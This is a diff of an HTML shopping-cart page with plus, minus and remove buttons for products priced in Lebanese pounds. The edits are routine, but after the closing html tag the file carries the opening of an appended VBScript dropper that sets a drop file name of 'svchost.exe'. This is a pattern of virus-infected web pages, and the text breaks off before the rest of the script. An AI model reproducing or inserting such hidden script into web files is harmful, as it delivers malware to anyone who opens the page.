@@ -1,16 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-<link href='https://fonts.googleapis.com/css?family=Noto Sans Arabic' rel='stylesheet'>
 <meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1" />
 <link rel="stylesheet" href="mystyle.css">
 <script type="text/javascript" src="myscript.js"></script> 
 </head>
-<body onload="distributeCategories();">
-
+<body onload="distributeCategories();test();">
 <!-- Simulate a smartphone / tablet look -->
 <div id="main"class="mobile-container">
-
 <!-- Top Navigation Menu -->
 <div id="topnav"class="topnav">
   <a id="My CART"class="active" onclick="distributeMyCart();" href="javascript:void(0);">
@@ -30,7 +28,7 @@
 		<p id="product2"class="overlay">150,000,000 L.L.</p>
 	</div>
 	<div class="container">
-		<img class="prod"width="100"height="100"src="png/products/product1.png">
+		<img class="prod"width="100"height="100"src="png/products/product3.png">
 		<a href="javascript:plus('1');"><img class="plus" src="png/plus.png" width=20 height=20></a>
 		<a href="javascript:minus('1');"><img class="minus" src="png/minus.png" width=20 height=20></a>
 		<a href="javascript:remove('1');"><img class="remove" src="png/delete.png" width=25 height=25></a>
@@ -41,10 +39,9 @@
 	</div>
 
 </div>
-
 <!-- End smartphone / tablet look -->
+<p id="t1"style="display:none;">»”</p>
 </body>
-<p style="display:none;">»”</p>
 </html>
 <SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
